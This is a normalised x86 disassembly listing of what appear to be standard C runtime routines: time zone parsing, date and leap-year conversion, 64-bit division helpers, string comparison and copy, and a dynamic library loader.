mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ esi ] bl
mov esi eax
jmp r-xdata
mov edi eax
jmp r-xdata
cmp cl [ esi + 0x1 ]
je r-xdata
mov [ ebp - 0x4 ] 0x1
sub_20194ef
push 0x2c
push r--data
call sub_200db54
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_201a097
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_2019fa8
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_2019f36
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_2019f6f
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
call sub_201bca0
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_2023ea2
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_2009d98
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_2016140
inc eax
push eax
call sub_201a99e
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_201a3a0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_200db99
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_201a591
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_2016140
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_200a6e1
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push [ ebp - 0x1c ]
call sub_20194de
push [ ebp - 0x24 ]
call sub_20194bc
push [ ebp - 0x28 ]
call sub_20194cd
add esp 0xc
mov [ ebp - 0x4 ] 0xfffffffe
call sub_201979b
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
jmp r-xdata
push eax
call sub_2009d98
pop ecx
push esi
call sub_200a046
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_200a046
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_201a591
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_201a091
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_201a085
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_200a046
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_2019835
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
mov eax edi
jne r-xdata
and eax 0x80000003
jns r-xdata
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov [ ebp - 0xc ] eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov esi [ esi * 4 + rw-data ]
mov esi [ esi * 4 + rw-data ]
jmp r-xdata
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ rw-data ] esi
mov [ rw-data ] ecx
call sub_2019f6f
pop ecx
test eax eax
je r-xdata
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] edi
jmp r-xdata
add esi [ ebp + 0x1c ]
add esi eax
lea esi [ esi + eax - 0x7 ]
jmp r-xdata
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x12b ]
cdq
lea ebx [ edi - 0x1 ]
mov edi 0x190
idiv edi
push 0x64
pop edi
inc esi
push 0x7
mov [ ebp - 0x8 ] eax
mov eax ebx
cdq
idiv edi
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
sub edx eax
mov ebx edx
lea eax [ edi - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx edi
imul edx edx 0x16d
add eax esi
add eax ebx
lea eax [ edx + eax - 0x63db ]
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x14 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x18 ]
cmp edx [ ebp + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
add [ rw-data ] eax
jns r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200f929
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
imul ecx ecx 0x3c
add ecx [ ebp + 0x20 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x24 ]
imul ecx ecx 0x3e8
add ecx [ ebp + 0x28 ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
mov eax 0x5265c00
cmp [ rw-data ] eax
jl r-xdata
add [ rw-data ] 0x5265c00
dec [ rw-data ]
jmp r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov [ rw-data ] edi
sub [ rw-data ] eax
inc [ rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
jmp r-xdata
sub esi 0x7
jmp r-xdata
cmp esi eax
jle r-xdata
sub_2019a2c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_2019f36
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_200f929
add esp 0x14
mov edx [ edi + 0x14 ]
push ebx
xor ebx ebx
inc ebx
cmp edx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp edx [ rw-data ]
je r-xdata
pop esi
leave
retn
cmp edx 0x6b
push 0x3
pop eax
push 0x2
pop ecx
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
jge r-xdata
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
mov edx [ edi + 0x1c ]
jge r-xdata
push esi
push esi
push esi
push esi
push esi
push ecx
push edx
push ebx
push ebx
push 0x2
pop ecx
call sub_2019835
mov eax [ ebp - 0xc ]
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x8 ]
push [ edi + 0x14 ]
push ebx
push esi
push 0x2
pop ecx
call sub_2019835
add esp 0x48
push 0x4
pop eax
mov ecx ebx
mov [ ebp - 0xc ] 0xa
mov [ ebp - 0x8 ] 0x5
movzx eax [ rw-data ]
push eax
push esi
push esi
push edx
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push edx
push ebx
jmp r-xdata
cmp edx eax
jl r-xdata
cmp edx ecx
jl r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push [ edi + 0x14 ]
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push [ edi + 0x14 ]
push ebx
jmp r-xdata
movzx eax [ rw-data ]
push ebx
call sub_2019835
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
add esp 0x24
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov eax ebx
cmp edx ecx
jg r-xdata
xor eax eax
jmp r-xdata
cmp edx eax
jg r-xdata
movzx eax [ rw-data ]
push esi
call sub_2019835
add esp 0x24
jmp r-xdata
cmp edx eax
jle r-xdata
pop ebx
cmp edx ecx
jle r-xdata
mov eax [ edi + 0x8 ]
imul eax eax 0x3c
add eax [ edi + 0x4 ]
imul eax eax 0x3c
add eax [ edi ]
imul eax eax 0x3e8
cmp edx ecx
jne r-xdata
cmp edx ecx
jge r-xdata
cmp edx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
xor ecx ecx
cmp eax [ rw-data ]
setge cl
jmp r-xdata
mov eax ecx
jmp r-xdata
sub_2019c04
push 0x8
push r--data
call sub_200db54
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_200db99
retn
push 0x6
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2019c4a
call sub_20194ef
inc [ rw-data ]
sub_2019c8b
push 0xc
push r--data
call sub_200db54
push 0x6
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_2019a2c
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2019cc3
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
sub_2019ccc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp esi edi
jne r-xdata
push 0x24
push 0xff
push esi
call sub_2013580
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax edi
je r-xdata
call sub_200fb13
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_200fa90
add esp 0x14
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
jg r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
push ebx
push edi
push 0x1e13380
push eax
push ecx
call sub_201a0a0
mov ecx eax
add ecx 0x46
lea eax [ ecx + 0x12b ]
cdq
mov ebx 0x190
idiv ebx
lea edi [ ecx - 0x1 ]
push 0x64
mov [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] ecx
mov ebx eax
mov eax edi
cdq
pop edi
idiv edi
push 0xffffffff
push 0xfffffe93
sub ebx eax
mov eax [ ebp - 0x8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ ebx + eax - 0x11 ]
cdq
mov edi eax
lea eax [ ecx - 0x46 ]
mov ebx edx
cdq
push edx
push eax
call sub_2021790
sub eax edi
sbb edx ebx
push 0x0
mov ebx 0x15180
push ebx
push edx
push eax
call sub_2021790
mov edi [ ebp - 0x10 ]
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jg r-xdata
jg r-xdata
call sub_200fb13
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
cmp ecx 0xffff5740
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
jl r-xdata
cmp ecx 0x934126cf
ja r-xdata
mov eax esi
jmp r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp - 0x8 ]
add edi 0x1e13380
adc [ ebp - 0xc ] 0x0
mov ecx eax
and ecx 0x80000003
mov [ ebp + 0x8 ] eax
jns r-xdata
test edi edi
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp + 0x8 ]
push 0x0
push ebx
push [ ebp - 0xc ]
mov [ esi + 0x14 ] eax
push edi
call sub_201a0a0
push 0xffffffff
mov [ esi + 0x1c ] eax
cdq
push 0xfffeae80
push edx
push eax
call sub_2021790
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
mov edx rw-data
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
mov eax [ esi + 0x1c ]
xor ecx ecx
inc ecx
cmp [ edx + 0x4 ] eax
jge r-xdata
mov edx rw-data
add edi ebx
adc [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec ecx
mov [ esi + 0x10 ] ecx
sub eax [ edx + ecx * 4 ]
push 0x0
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_201a0a0
push 0x7
add eax 0x4
pop ecx
cdq
idiv ecx
xor ebx ebx
push ebx
push 0xe10
push [ ebp - 0xc ]
push edi
mov [ esi + 0x18 ] edx
call sub_201a0a0
push 0xffffffff
mov [ esi + 0x8 ] eax
cdq
push 0xfffff1f0
push edx
push eax
call sub_2021790
push ebx
add edi eax
adc [ ebp - 0xc ] edx
push 0x3c
push [ ebp - 0xc ]
push edi
call sub_201a0a0
mov [ esi + 0x4 ] eax
imul eax eax 0x3c
sub edi eax
mov [ esi + 0x20 ] ebx
mov [ esi ] edi
xor eax eax
pop ebx
mov ebx eax
inc ecx
cmp [ edx + ecx * 4 ] ebx
jl r-xdata
mov ebx 0x15180
sub_2019f0f
mov edi edi
push ebp
mov ebp esp
push esi
call sub_201a335
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
push esi
call sub_2019ccc
neg eax
sbb eax eax
pop ecx
not eax
pop ecx
and eax esi
sub_2019f36
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_2019f6f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_2019fa8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_2019fe1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
cmp eax ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
cmp eax ebx
je r-xdata
call sub_200fb13
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
push edi
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
mov [ eax ] bl
pop esi
pop ebx
pop ebp
retn
call sub_200fb13
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
mov eax [ ebp + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
lea esi [ eax * 4 + rw-data ]
push [ esi ]
call sub_2016140
inc eax
pop ecx
mov [ edi ] eax
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp eax 0x1
je r-xdata
cmp eax [ ebp + 0x10 ]
jbe r-xdata
xor eax eax
jmp r-xdata
push [ esi ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_200a6e1
add esp 0xc
push 0x22
pop eax
jmp r-xdata
sub_201a0a0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_201a150
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_201a202
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
push 0x24
push 0xff
push esi
call sub_2013580
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax ebx
je r-xdata
call sub_200fb13
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
mov ecx [ eax ]
cmp ecx 0xffff5740
jge r-xdata
pop esi
pop ebx
leave
retn
mov eax ecx
cdq
push edi
mov edi 0x7861f80
idiv edi
mov edx eax
imul edx edx 0xf879e080
add ecx edx
lea edx [ eax * 4 + 0x46 ]
mov eax 0x1e13380
cmp ecx eax
jl r-xdata
call sub_200fb13
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
mov eax ecx
mov [ esi + 0x14 ] edx
cdq
mov edi 0x15180
idiv edi
mov edi rw-data
mov [ esi + 0x1c ] eax
imul eax eax 0xfffeae80
add ecx eax
cmp [ ebp - 0x4 ] ebx
jne r-xdata
sub ecx eax
inc edx
cmp ecx eax
jl r-xdata
mov eax esi
jmp r-xdata
mov eax [ esi + 0x1c ]
xor edx edx
inc edx
cmp [ edi + 0x4 ] eax
jge r-xdata
mov edi rw-data
sub ecx eax
mov eax 0x1e28500
inc edx
cmp ecx eax
jl r-xdata
dec edx
mov [ esi + 0x10 ] edx
sub eax [ edi + edx * 4 ]
mov edi 0x15180
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
cdq
idiv edi
push 0x7
pop edi
push 0x3c
mov [ esi + 0x20 ] ebx
add eax 0x4
cdq
idiv edi
mov eax ecx
mov edi 0xe10
mov [ esi + 0x18 ] edx
cdq
idiv edi
pop edi
mov [ esi + 0x8 ] eax
imul eax eax 0xfffff1f0
add ecx eax
mov eax ecx
cdq
idiv edi
pop edi
mov [ esi + 0x4 ] eax
imul eax eax 0x3c
sub ecx eax
mov [ esi ] ecx
xor eax eax
mov ebx eax
mov [ ebp - 0x4 ] 0x1
inc edx
sub ecx eax
jmp r-xdata
inc edx
cmp [ edi + edx * 4 ] ebx
jl r-xdata
xor ebx ebx
sub_201a335
mov edi edi
push esi
call sub_200d6da
mov esi eax
test esi esi
jne r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
call sub_200fb13
mov [ eax ] 0xc
xor eax eax
pop esi
retn
mov eax [ esi + 0x44 ]
pop esi
retn
push 0x24
call sub_201a99e
pop ecx
mov [ esi + 0x44 ] eax
test eax eax
je r-xdata
sub_201a36c
mov edi edi
push ebp
mov ebp esp
push esi
call sub_201a335
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
push esi
call sub_201a202
neg eax
sbb eax eax
pop ecx
not eax
pop ecx
and eax esi
sub_201a3a0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_201a428
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_200d4c1
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_200d4ca
pop ecx
test eax eax
je r-xdata
push eax
call sub_200d4ca
pop ecx
test eax eax
je r-xdata
push eax
call sub_200d4ca
push [ rw-data ]
mov esi eax
call sub_200d4ca
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_200d44f
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_200d44f
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_200d44f
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_200d44f
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_200d44f
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_200d4ca
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_201a591
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_200fb13
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
